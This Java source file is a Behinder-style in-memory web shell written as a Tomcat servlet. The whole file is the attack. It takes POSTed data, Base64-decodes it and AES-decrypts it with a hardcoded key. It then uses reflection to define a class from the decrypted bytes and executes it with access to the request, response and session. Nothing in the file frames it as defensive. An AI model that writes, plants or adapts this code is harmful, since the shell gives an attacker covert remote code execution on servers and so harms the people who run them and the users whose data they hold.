package com.example.memshelltomcat;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.HashMap;

public class behinder4 implements Servlet {
    @Override
    public void init(ServletConfig config) throws ServletException {

    }
    public static Class defClass(byte[] classBytes) throws Exception {
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        defineClass.setAccessible(true);
        return (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(),classBytes,0,classBytes.length);
    }
    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        customCode(servletRequest,servletResponse);
    }
    public static void customCode(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;
        HttpSession session = request.getSession();
        HashMap pageContext = new HashMap();
        pageContext.put("request", request);
        pageContext.put("response", response);
        pageContext.put("session", session);

        if (request.getMethod().equals("POST")){
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            byte[] buf = new byte[512];
            int length=request.getInputStream().read(buf);
            while (length>0)
            {
                byte[] data= Arrays.copyOfRange(buf,0,length);
                bos.write(data);
                length=request.getInputStream().read(buf);
            }
            byte[] data = bos.toByteArray();
            String k="e45e329feb5d925b";
            byte[] decodebs;
            Class baseCls ;
            byte[] resCode;
            javax.crypto.Cipher c= null;
            try {
                c = javax.crypto.Cipher.getInstance("AES/ECB/PKCS5Padding");
                c.init(2,new javax.crypto.spec.SecretKeySpec(k.getBytes(),"AES"));
                baseCls=Class.forName("java.util.Base64");
                Object Decoder=baseCls.getMethod("getDecoder", null).invoke(baseCls, null);
                decodebs=(byte[]) Decoder.getClass().getMethod("decode", new Class[]{byte[].class}).invoke(Decoder, new Object[]{data});
                resCode = c.doFinal(decodebs);
            }
            catch (Exception e)
            {
                System.out.println("444444");
                try {
                    baseCls = Class.forName("sun.misc.BASE64Decoder");
                    Object Decoder=baseCls.newInstance();
                    decodebs=(byte[]) Decoder.getClass().getMethod("decodeBuffer",new Class[]{String.class}).invoke(Decoder, new Object[]{new String(data)});
                    resCode = c.doFinal(decodebs);
                } catch (Exception ex) {
                    throw new RuntimeException(ex);
                }
            }

            try {
                Class res = defClass(resCode);
                res.newInstance().equals(pageContext);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
    }
    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }
}
